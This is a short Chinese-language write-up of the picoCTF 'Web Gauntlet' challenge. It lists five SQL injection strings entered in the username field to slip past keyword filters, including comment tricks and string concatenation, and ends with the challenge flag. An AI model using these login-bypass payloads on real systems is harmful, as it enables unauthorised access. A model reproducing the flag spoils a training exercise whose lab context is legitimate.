# Web Gauntlet
[Challenge](https://play.picoctf.org/practice/challenge/88)

## Solution


題目就是在考SQL Injection而已，filter.php那個連結會提示他過濾了那些字。但我很多題都送一樣的sql進去，反正能過關就好，也是因為我會的指令也不多就是了...

以下附上我每題的input，通通都是加在username那一欄，password隨便打：

```
1. admin';--
2. admin';0x2d2d
3. admin';0x2d2d
4. ad'||'min';0x2d2d
5. ad'||'min';0x2d2d
```

## Flag

picoCTF{y0u_m4d3_1t_16f769e719ab9d3e310fd13dc1262ee1}